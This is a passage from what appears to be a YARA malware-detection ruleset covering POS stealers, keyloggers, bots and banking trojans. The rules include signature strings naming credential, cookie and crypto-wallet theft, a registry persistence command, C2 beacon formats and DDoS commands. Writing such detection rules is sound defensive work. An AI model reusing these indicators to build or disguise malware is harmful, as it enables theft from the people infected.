\"Abaddon\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Darien Huss, Proofpoint\"\n        source = \"https://github.com/bwall/bamfdetect\"\n        original_name = \"AbaddonPOS\"\n        license = \"MIT (https://opensource.org/licenses/MIT)\"\n\n    strings:\n        $s1 = \"devil_host\" fullword ascii\n        $s2 = \"Chrome\" fullword ascii\n        $s3 = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" fullword ascii\n        $i1 = { 31 ?? 81 ?? 55 89 E5 8B 74 }\n\n    condition:\n        uint16(0) == 0x5a4d and (all of ($s*) or $i1) and filesize <= 10KB\n}\n\nrule Agenttesla\n{\n    meta:\n        description = \"Agent Tesla keylogger strings\"\n        ref = \"https://thisissecurity.stormshield.com/2018/01/12/agent-tesla-campaign/\"\n        classifications = \"Spyware\"\n        threat_names = \"Agent Tesla\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Stormshield\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Agenttesla\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $html_username = \"<br>UserName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: \" wide ascii\n        $html_pc_name = \"<br>PC&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: \" wide ascii\n        $html_os_name = \"<br>OS&nbsp;Full&nbsp;Name&nbsp;&nbsp;: \" wide ascii\n        $html_os_platform = \"<br>OS&nbsp;Platform&nbsp;&nbsp;&nbsp;: \" wide ascii\n        $html_clipboard = \"<br><span style=font-style:normal;text-decoration:none;text-transform:none;color:#FF0000;><strong>[clipboard]</strong></span>\" wide ascii\n\n    condition:\n        3 of them\n}\n\nrule AgentTesla_SMTP_Communication\n{\n    meta:\n        description = \"Agent Tesla unencrypted smtp connection\"\n        classifications = \"Spyware\"\n        threat_names = \"Agent Tesla\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    strings:\n        $mail_subject = \"Subject:\" fullword \n        $info1 = \"Passwords Recovered From:\" fullword\n        $info2 = \"Keystrokes From:\" fullword\n        $info3 = \"Webcam Capture From:\" fullword\n        $info4 = \"Screen Capture From:\" fullword\n        $info5 = \"Recovered Cookies\" fullword\n        \n    condition:\n        (vmray_target_class == \"pcap\")\n        and ((for all i in (1..#mail_subject) : (@mail_subject[i] + 80 > @info1[i]))\n        or (for all i in (1..#mail_subject) : (@mail_subject[i] + 80 > @info2[i]))\n        or (for all i in (1..#mail_subject) : (@mail_subject[i] + 80 > @info3[i]))\n        or (for all i in (1..#mail_subject) : (@mail_subject[i] + 80 > @info4[i]))\n        or (for all i in (1..#mail_subject) : (@mail_subject[i] + 80 > @info5[i])))\n}\n\nrule AgentTesla_SMTP_MsgBody\n{\n    meta:\n        description = \"Agent Tesla unencrypted smtp msg body\"\n        classifications = \"Spyware\"\n        threat_names = \"Agent Tesla\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    strings:\n        $a1 = \"<br>UserName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:\" wide ascii\n        $a2 = \"<br>PC&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:\" wide ascii\n        $a3 = \"<br>OS&nbsp;Full&nbsp;Name&nbsp;&nbsp;:\" wide ascii\n        $a4 = \"<br>OS&nbsp;Platform&nbsp;&nbsp;&nbsp;:\" wide ascii\n        $a5 = \"<br>OS&nbsp;Version&nbsp;&nbsp;&nbsp;&nbsp;:\" wide ascii\n        $a6 = \"<br>CPU&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:\" wide ascii\n        $a7 = \"<br>RAM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:\" wide ascii\n        $a8 = \"<br>VideocardName&nbsp;:\" wide ascii\n        $a9 = \"<br>VideocardMem&nbsp;&nbsp;:\" wide ascii\n        $b1 = \"<br>UserName:\" wide ascii\n        $b2 = \"<br>OSFullName:\" wide ascii\n        $b3 = \"<br>CPU:\" wide ascii\n        $b4 = \"<br>IP:\" wide ascii\n        $b5 = {43 6f 3d 0d 0a 6d 70 75 74 65 72 4e 61 6d 65 3a 20}\n        $b6 = \"<br>RAM:\" wide ascii\n\n    condition:\n        (vmray_target_class == \"pcap\" or uint16(0) == 0x5A4D) \n        and (5 of ($a*)\n        or all of ($b*))\n}\n\nprivate rule Alina_Blacklist\n{\n    strings: \n        $b01 = \"dwm.exe\"\n        $b02 = \"win-firewall.exe\"\n        $b03 = \"adobeflash.exe\"\n        $b04 = \"desktop.exe\"\n        $b05 = \"jucheck.exe\"\n        $b06 = \"jusched.exe\"\n        $b07 = \"java.exe\"\n        $b08 = \"pidgin.exe\"\n        $b09 = \"skype.exe\"\n        $b10 = \"thunderbird.exe\"\n        $b11 = \"devenv.exe\"\n        $b12 = \"steam.exe\"\n        $b13 = \"wininit.exe\"\n        $b14 = \"crss.exe\"\n        $b15 = \"smss.exe\"\n        $b16 = \"svchost.exe\"\n        $b17 = \"iexplore.exe\"\n        $b18 = \"firefox.exe\"\n        $b19 = \"chrome.exe\"\n        $b20 = \"explorer.exe\"\n\n    condition:\n        13 of them\n}\n\nprivate rule Alina_PosRegex\n{\n    strings:\n        $r1 = \"([0-9]{13,19}=(1[2-9])(0[1-9]|1[0-2])[0-9]{3,50}\\\\?)\"\n        $r2 = \"((%?[Bb]?)[0-9]{13,19}\\\\^[A-Za-z\\\\s]{0,26}/[A-Za-z\\\\s]{0,26}\\\\^(1[2-9])(0[1-9]|1[0-2])[0-9\\\\s]{3,50}\\\\?)\"\n        $r3 = \"((%?[Bb\u00b4`]?)[0-9]{13,19}\\\\^[A-Za-z\\\\s]{0,26}/[A-Za-z\\\\s]{0,26}\\\\^(1[2-9])(0[1-9]|1[0-2])[0-9\\\\s]{3,50}\\\\?)\"\n        $r4 = \"1[0-2])[0-9]\"\n\n    condition:\n        any of them\n}\n\nrule Alina_1_0\n{\n    meta:\n        description = \"Alina POS malware\"\n        classifications = \"Spyware\"\n        threat_names = \"Alina v1.0\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    strings:\n        $s1 = \"Alina v1.0\"\n        $s2 = \"POST\"\n        $s3 = \"1[0-2])[0-9]\"\n        $s4 = \"&hwid=\"\n        $s5 = \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\"\n        $s6 = \"D:\\\\Files\\\\Documents\\\\Projekte\\\\grab\\\\Release\\\\Alina.pdb\"\n\n    condition:\n        (\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n         and Alina_Blacklist and Alina_PosRegex and\n        5 of ($s*)\n}\n\nrule Alina_3_Generic\n{\n    meta:\n        description = \"Alina POS malware\"\n        classifications = \"Spyware\"\n        threat_names = \"Alina v3.x\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    strings:\n        $s0 = \"check_update\"\n        $s1 = \"Possible installation error: %s not deletable. wont kill registry record for now\"\n        $s2 = \"do_update\"\n        $s3 = \"OpenProcess failed with PROCESS_QUERY_INFORMATION | PROCESS_TERMINATE rights pid %d (%s)\"\n        $s4 = \"Submit to Backend No %d SUCCESS. (%s:%d%s) -> %d\"\n        $s5 = \"PID %d (%s) blacklisted from scanning\"\n        $s6 = \"http_request\"\n        $s7 = \"panel_request\"\n        $s8 = \"_submit_logs\"\n        $s9 = \"installcheck\"\n        $s10 = \"scan end\"\n        $s11 = \"End run (%d ticks)\"\n        $s12 = \"PID %d (%s) added for scanning. Inject DLL = %d\"\n        $s13 = \"alina=start_update_thread\"\n        $s14 = \"act=%s&b=%s&c=%s&v=%s&p=%s&%s=\"\n        $s15 = \"scan start %d B\"\n        $s16 = \"Setting updateinterval from %d to %d because of %s\"\n        $s17 = \"Could not update %s -> %s. Please stop sending command\"\n        $s18 = \"update=%s;%s\"\n        $s19 = \"Found other process %s at pid %d. Killed.\"\n\n    condition:\n        (\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and Alina_Blacklist and Alina_PosRegex and\n        10 of them\n}\n\nrule Alina_3_3\n{\n    meta:\n        description = \"Alina POS malware\"\n        classifications = \"Spyware\"\n        threat_names = \"Alina v3.3\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    strings:\n        $s1 = \"Alina v3.3\"\n        $s2 = \"[%s:%d]\"\n        $s3 = \"Handles hN = %d, hS = %d\"\n        $s4 = \"Had3yghhujujghgdfd9G6790hfv3.3\"\n\n    condition:\n        Alina_3_Generic and\n        all of them\n}\n\nrule Alina_3_4\n{\n    meta:\n        description = \"Alina POS malware\"\n        classifications = \"Spyware\"\n        threat_names = \"Alina v3.4\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    strings:\n        $s1 = \"Handles hN = %d (%s), hS = %d (%s). Trying CopyFile.\"\n        $s2 = \"Had3yghhuju98gggd9G6790hfv3.4\"\n        $s3 = \"[%s:%d <%x>]\"\n        $s4 = \"Alina v3.4\"\n        $s5 = \"update=%s;%s\"\n\n    condition:\n        Alina_3_Generic and\n        all of them\n}\n\nrule Amadey\n{\n    meta:\n        author = \"VMRay Labs\"\n        description = \"Artifacts of the Amadey Downloader\"\n        threat_names = \"Amadey\"\n        classifications = \"Downloader\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n\n    strings:\n        $beacon_part1 = \"id=\"\n        $beacon_part2 = \"&sd=\"\n        $beacon_part3 = \"&vs=\"\n        $beacon_part4 = \"&ar=\"\n        $beacon_part5 = \"&bi=\"\n        $beacon_part6 = \"&lv=\"\n        $beacon_part7 = \"&os=\"\n        $beacon_part8 = \"&av=\"\n        $beacon_part9 = \"&pc=\"\n        $beacon_part10 = \"&un=\"\n        $http_header = \"Content-Type: application/x-www-form-urlencoded\"\n\n        $av_avast = \"C:\\\\ProgramData\\\\AVAST Software\"\n        $av_avira = \"C:\\\\ProgramData\\\\Avira\"\n        $av_kaspersky = \"C:\\\\ProgramData\\\\Kaspersky Lab\"\n        $av_eset = \"C:\\\\ProgramData\\\\ESET\"\n        $av_panda = \"C:\\\\ProgramData\\\\Panda Security\"\n        $av_doctor = \"C:\\\\ProgramData\\\\Doctor Web\"\n        $av_avg = \"C:\\\\ProgramData\\\\AVG\"\n        $av_360 = \"C:\\\\ProgramData\\\\360TotalSecurity\"\n        $av_bitdef = \"C:\\\\ProgramData\\\\Bitdefender\"\n        $av_norton = \"C:\\\\ProgramData\\\\Norton\"\n        $av_sophos = \"C:\\\\ProgramData\\\\Sophos\"\n        $av_comodo = \"C:\\\\ProgramData\\\\Comodo\"\n\n        $auto_run = \"REG ADD \\\"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\User Shell Folders\\\" /f /v Startup /t REG_SZ /d\" \n\n    condition:\n        ( analysis_id == \"pcap\"\n        or mime_type == \"application/vnd.tcpdump.pcap\"\n        or mime_type == \"text/plain\" )\n        and ( all of ($beacon_*) and $http_header \n        or all of ($av_*) and $auto_run )\n}\n\nrule Amadey_Decoding_Loop\n{\n    meta:\n        author = \"VMRay Labs\"\n        description = \"String Decoding Routine used by Amadey\"\n        threat_names = \"Amadey\"\n        classifications = \"Downloader\"\n        vti_default_score = 5 \n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n\n    strings:    \n        // 89 04 24     MOV        dword ptr [ESP]=>local_1c,EAX\n        // e8 ?? ??     CALL       _strlen\n        // ?? ??\n        // 39 45 f4     CMP        dword ptr [EBP + counter],enc_str_length\n        // ?? ??\n        // 8b 75 f4     MOV        ESI,dword ptr [EBP + counter]\n        // 81 c6 ??     ADD        ESI,dec_result\n        // ?? ?? ??\n        // 8b 45 08     MOV        enc_str_length,dword ptr [EBP + enc_str]\n        // 8b 5d f4     MOV        EBX,dword ptr [EBP + counter]\n        // 01 c3        ADD        EBX,enc_str_length\n        // c7 04 24     MOV        dword ptr [ESP]=>local_1c,dec_key\n        // ?? ?? ?? ??\n        // e8 ?? ??     CALL       _strlen\n        // ?? ??\n        // 89 c2        MOV        EDX,key_length\n        // 8b 45 f4     MOV        key_length,dword ptr [EBP + counter]\n        // 89 d1        MOV        ECX,EDX\n        // ba 00 00     MOV        EDX,0x0\n        // 00 00\n        // f7 f1        DIV        ECX\n        // 0f b6 92     MOVZX      EDX,byte ptr [EDX + dec_key]\n        // ?? ?? ?? ??\n        // 0f b6 03     MOVZX      key_length,byte ptr [EBX]\n        // 28 d0        SUB        key_length,DL\n        // 88 06        MOV        byte ptr [ESI],key_length=>dec_result\n        // 8d 45 f4     LEA        key_length=>counter,[EBP + -0xc]\n        // ff 00        INC        dword ptr [key_length]=>counter\n\n        $hex_loop = { (89 04 24 | 50 | c7 04 24 ?? ?? ?? ??) e8 ?? ?? ?? ?? 39 45 f4 ?? ?? 8b 75 f4 81 c6 ?? ?? ?? ?? [0-3] 8b 5d f4 (01 c3 | 81 c3 ?? ?? ?? ??) c7 04 24 ?? ?? ?? ?? e8 ?? ?? ?? ?? 89 c2 8b 45 f4 89 d1 ba 00 00 00 00 f7 f1 0f b6 92 ?? ?? ?? ?? 0f b6 03 28 d0 88 06 8d 45 f4 ff 00 }\n\n    condition:\n        ( mime_type == \"application/octet-stream\"\n        or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) )\n        and $hex_loop\n}\n\nrule andromeda\n{\n    meta:\n        description = \"Andromeda / Gamarue bot\"\n        classifications = \"Bot\"\n        threat_names = \"Andromeda\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Brian Wallace @botnet_hunter\"\n        source = \"https://github.com/bwall/bamfdetect\"\n        original_name = \"andromeda\"\n        license = \"MIT (https://opensource.org/licenses/MIT)\"\n\n    strings:\n        $config = {1c 1c 1d 03 49 47 46}\n        $c1 = \"hsk\\\\ehs\\\\dihviceh\\\\serhlsethntrohntcohurrehem\\\\chsyst\"\n\n    condition:\n        all of them\n}\n\nrule Worm_Gamarue\n{\n    meta:\n        description = \"Andromeda / Gamarue bot\"\n        ref = \"https://www.ccn-cert.cni.es/informes/informes-ccn-cert-publicos.html\"\n        classifications = \"Bot\"\n        threat_names = \"Andromeda\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Centro Criptol\u00f3gico Nacional (CCN)\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Worm_Gamarue\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a = { 69 E1 2A B0 2D 80 44 E3 2D 80 44 E3 2D 80 44 E3 EE 8F 1B E3 2A 80 44 E3 EE 8F 19 E3 3A 80 44 E3 2D 80 45 E3 CD 81 44 E3 0A 46 39 E3 34 80 44 E3 0A 46 29 E3 A5 80 44 E3 0A 46 2A E3 5C 80 44 E3 0A 46 36 E3 2C 80 44 E3 0A 46 3C E3 2C 80 44 E3 }\n\n    condition:\n        $a\n}\n\nrule andromeda_bot\n{\n    meta:\n        description = \"Andromeda / Gamarue bot\"\n        classifications = \"Bot\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"https://github.com/reed1713\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"andromeda_bot\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $type = \"Microsoft-Windows-Security-Auditing\"\n        $eventid = \"4688\"\n        $data = \"AppData\\\\Local\\\\Temp\\\\_.net_\\\\msiexec.exe\"\n\n    condition:\n        all of them\n}\n\nrule AthenaHTTP\n{\n    meta:\n        description = \"Athena HTTP Bot\"\n        classifications = \"Bot\"\n        threat_names = \"Athena\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Brian Wallace @botnet_hunter\"\n        source = \"https://github.com/bwall/bamfdetect\"\n        original_name = \"AthenaHTTP\"\n        license = \"MIT (https://opensource.org/licenses/MIT)\"\n\n    strings:\n        $s1 = \"%s(%s)\"\n        $s2 = \"type:on_exec\"\n        $s3 = \"uid:%s\"\n        $s4 = \"priv:%s\"\n        $s5 = \"arch:x%s\"\n        $s6 = \"gend:%s\"\n        $s7 = \"cores:%i\"\n        $s8 = \"ver:%s\"\n        $s9 = \"net:%s\"\n\n    condition:\n        all of them\n}\n\nrule AthenaHTTP_v2\n{\n    meta:\n        description = \"Athena HTTP Bot\"\n        classifications = \"Bot\"\n        threat_names = \"Athena\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Jason Jones <jasonjones@arbor.net>\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"AthenaHTTP_v2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $fmt_str1 = \"|type:on_exec|uid:%s|priv:%s|arch:x%s|gend:%s|cores:%i|os:%s|ver:%s|net:%s|\"\n        $fmt_str2 = \"|type:repeat|uid:%s|ram:%ld|bk_killed:%i|bk_files:%i|bk_keys:%i|busy:%s|\"\n        $cmd1 = \"filesearch.stop\"\n        $cmd2 = \"rapidget\"\n        $cmd3 = \"layer4.\"\n        $cmd4 = \"slowloris\"\n        $cmd5 = \"rudy\"\n\n    condition:\n        all of ($fmt_str*) and 3 of ($cmd*)\n}\n\nrule AthenaIRC\n{\n    meta:\n        description = \"Athena HTTP Bot\"\n        classifications = \"Bot\"\n        threat_names = \"Athena\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Jason Jones <jasonjones@arbor.net>\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"AthenaIRC\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $cmd1 = \"ddos.\" fullword\n        $cmd2 = \"layer4.\" fullword\n        $cmd3 = \"war.\" fullword\n        $cmd4 = \"smartview\" fullword\n        $cmd5 = \"ftp.upload\" fullword\n        $msg1 = \"%s %s :%s LAYER4 Combo Flood: Stopped\"\n        $msg2 = \"%s %s :%s IRC War: Flood started [Type: %s | Target: %s]\"\n        $msg3 = \"%s %s :%s FTP Upload: Failed\"\n        $msg4 = \"Athena v2\"\n        $msg5 = \"%s %s :%s ECF Flood: Stopped [Total Connections: %ld | Rate: %ld Connections/Second]\"\n        $amsg1 = \"ARME flood on %s/%s:%i for %i seconds [Host confirmed vulnerable\"\n        $amsg2 = \" Rapid HTTP Combo flood on %s:%i for %i seconds\"\n        $amsg3 = \"Began flood: %i connections every %i ms to %s:%i\"\n        $amsg4 = \"IPKiller>Athena\"\n        $amsg5 = \"Athena=Shit!\"\n        $amsg6 = \"Athena-v1\"\n        $amsg7 = \"BTC wallet.dat file found\"\n        $amsg8 = \"MineCraft lastlogin file found\"\n        $amsg9 = \"Process '%s' was found and scheduled for deletion upon next reboot\"\n        $amsg10 = \"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\"\n        $amsg11 = \"Rapid Connect/Disconnect\"\n        $amsg12 = \"BTC wallet.dat found,\"\n        $acmd1 = \":!arme\"\n        $acmd2 = \":!openurl\"\n        $acmd3 = \":!condis\"\n        $acmd4 = \":!httpcombo\"\n        $acmd5 = \":!urlblock\"\n        $acmd6 = \":!udp\"\n        $acmd7 = \":!btcwallet\"\n\n    condition:\n        (all of ($cmd*) and 3 of ($msg*)) or (5 of ($amsg*) and 5 of ($acmd*))\n}\n\nrule Atmos_Malware\n{\n    meta:\n        description = \"Atmos banking trojan\"\n        ref = \"http://www.xylibox.com/2016/02/citadel-0011-atmos.html\"\n        classifications = \"Spyware\"\n        threat_names = \"Atmos\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"xylitol@temari.fr\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Atmos_Malware\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $LKEY = \"533D9226E4C1CE0A9815DBEB19235AE4\" wide ascii\n        $TS1 = \"X-TS-Rule-Name: %s\" wide ascii\n        $TS2 = \"X-TS-Rule-PatternID: %u\" wide ascii\n        $TS3 = \"X-TS-BotID: %s\" wide ascii\n        $TS4 = \"X-TS-Domain: %s\" wide ascii\n        $TS5 = \"X-TS-SessionID: %s\" wide ascii\n        $TS6 = \"X-TS-Header-Cookie: %S\" wide ascii\n        $TS7 = \"X-TS-Header-Referer: %S\" wide ascii\n        $TS8 = \"X-TS-Header-AcceptEncoding: %S\" wide ascii\n        $TS9 = \"X-TS-Header-AcceptLanguage: %S\" wide ascii\n        $TS10 = \"X-TS-Header-UserAgent: %S\" wide ascii\n        $VNC1 = \"_hvnc_init@4\" wide ascii\n        $VNC2 = \"_hvnc_uninit@0\" wide ascii\n        $VNC3 = \"_hvnc_start@8\" wide ascii\n        $VNC4 = \"_hvnc_stop@0\" wide ascii\n        $VNC5 = \"_hvnc_wait@0\" wide ascii\n        $VNC6 = \"_hvnc_work@0\" wide ascii\n        $WB1 = \"nspr4.dll\" wide ascii\n        $WB2 = \"nss3.dll\" wide ascii\n        $WB3 = \"chrome.dll\" wide ascii\n        $WB4 = \"Internet Explorer\" wide ascii\n        $WB5 = \"Firefox\" wide ascii\n        $WB6 = \"Chrome\" wide ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and $LKEY) and ((5 of ($TS*) and all of ($WB*)) or (3 of ($VNC*) and all of ($WB*))) and filesize < 300KB\n}\n\nrule Atmos_Packed_Malware\n{\n    meta:\n        description = \"Atmos banking trojan\"\n        ref = \"http://www.xylibox.com/2016/02/citadel-0011-atmos.html\"\n        classifications = \"Spyware\"\n        threat_names = \"Atmos\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"xylitol@temari.fr\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Atmos_Packed_Malware\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a = {55 8B EC 83 EC 0C 53 56 8B 35 ?? ?? ?? 00 57 33 DB BF 00 28 00 00}\n        $b = {68 ?? ?? ?? ?? FF 15 ?? ?? ?? 00 E9 62 FF FF FF E8 69 10 FE FF 5F 5E 5B C9 C3}\n        $c = {53 68 65 6C 6C 45 78 65 63 75 74 65 45 78 57 00 53 48 45 4C 4C 33 32 2E 64 6C 6C 00 1E 00 47 65}\n        $d = {74 55 73 65 72 4E 61 6D 65 45 78 57 00 00 53 65 63 75 72 33 32 2E 64 6C 6C 00 10 00}\n        $e = {55 8B EC 83 E4 F8 83 EC 1C 83 7D 08 00 57 74 ?? 6A FF FF 75 08 FF 15 ?? ?? ?? 00}\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule Atmos_Builder\n{\n    meta:\n        description = \"Atmos banking trojan builder\"\n        ref = \"http://www.xylibox.com/2016/02/citadel-0011-atmos.html\"\n        classifications = \"Spyware\"\n        threat_names = \"Atmos\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"xylitol@temari.fr\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Atmos_Builder\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $LKEY = \"533D9226E4C1CE0A9815DBEB19235AE4\" wide ascii\n        $HWID = \"D19FC0FB14BE23BCF35DA427951BB5AE\" wide ascii\n        $s1 = \"url_loader=%S\" wide ascii\n        $s2 = \"url_webinjects=%S\" wide ascii\n        $s3 = \"url_tokenspy=%S\" wide ascii\n        $s4 = \"file_webinjects=%S\" wide ascii\n        $s5 = \"moneyparser.enabled=%u\" wide ascii\n        $s6 = \"enable_luhn10_post=%u\" wide ascii\n        $s7 = \"insidevm_enable=%u\" wide ascii\n        $s8 = \"disable_antivirus=%u\" wide ascii\n\n    condition:\n        uint16(0) == 0x5a4d and $LKEY and $HWID and all of ($s*)\n}\n\nrule Azorult_V2\n{\n    meta:\n        description = \"Azorult spyware\"\n        ref = \"http://www.kernelmode.info/forum/viewtopic.php?f=16&t=4819&p=30867\"\n        classifications = \"Spyware\"\n        threat_names = \"AZORult v2\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Xylitol xylitol@temari.fr\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Windows_Malware\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $string1 = \"ST234LMUV56CklAopq78Brstuvwxyz01NOPQRmGHIJKWXYZabcdefgDEFhijn9+/\" wide ascii\n        $string2 = \"SYSInfo.txt\"\n        $string3 = \"CookieList.txt\"\n        $string4 = \"Passwords.txt\"\n        $constant1 = {85 C0 74 40 85 D2 74 31 53 56 57 89 C6 89 D7 8B 4F FC 57}\n        $constant2 = {68 ?? ?? ?? ?? FF 75 FC 68 ?? ?? ?? ?? 8D 45 F8 BA 03 00}\n\n    condition:\n        (uint16(0) == 0x5a4d and all of ($string*) and ($constant1 or $constant2))\n}\n\nrule Azorult_Generic\n{\n    meta:\n        description = \"Azorult v2 and v3\"\n        classifications = \"Spyware\"\n        threat_names = \"AZORult\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    strings:\n        $coin_1 = \"%appdata%\\\\Electrum\\\\wallets\" wide ascii\n        $coin_2 = \"Coins\\\\Ethereum\" wide ascii\n        $coin_3 = \"%APPDATA%\\\\Ethereum\\\\keystore\" wide ascii\n        $coin_4 = \"Coins\\\\Exodus\" wide ascii\n        $coin_5 = \"%APPDATA%\\\\Exodus\" wide ascii\n        $coin_6 = \"Coins\\\\Jaxx\\\\Local Storage\" wide ascii\n        $c2rel_1 = \"Skype\" wide ascii\n        $c2rel_2 = \"Telegram\" wide ascii\n        $c2rel_3 = \"Steam\" wide ascii\n        $c2rel_4 = \"PasswordsList.txt\" wide ascii\n        $c2rel_5 = \"Browsers\\\\Cookies\" wide ascii\n        $c2rel_6 = \"Browsers\\\\History\" wide ascii\n        $user_agent = \"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.1)\" wide ascii\n\n    condition:\n        uint16(0) == 0x5a4d \n        and all of ($c2rel_*)\n        and $user_agent\n        and 2 of ($coin*)\n}\n\nrule Azorult_v3_Connection\n{\n    meta:\n        description = \"Azorult v3 C2 Communication\"\n        classifications = \"Spyware\"\n        threat_names = \"AZORult v3\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n        \n    strings:\n        $user_agent = \"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.1)\" wide ascii\n        $prep_key = \"Cache-Control: no-cache\\x0d\\x0a\\x0d\\x0a\\x00\\x00\\x00\" wide ascii\n        \n    condition:\n        vmray_target_class == \"pcap\"\n        and all of them\n}\n\nrule Babar_Malware\n{\n    meta:\n        description = \"Babar spyware\"\n        ref = 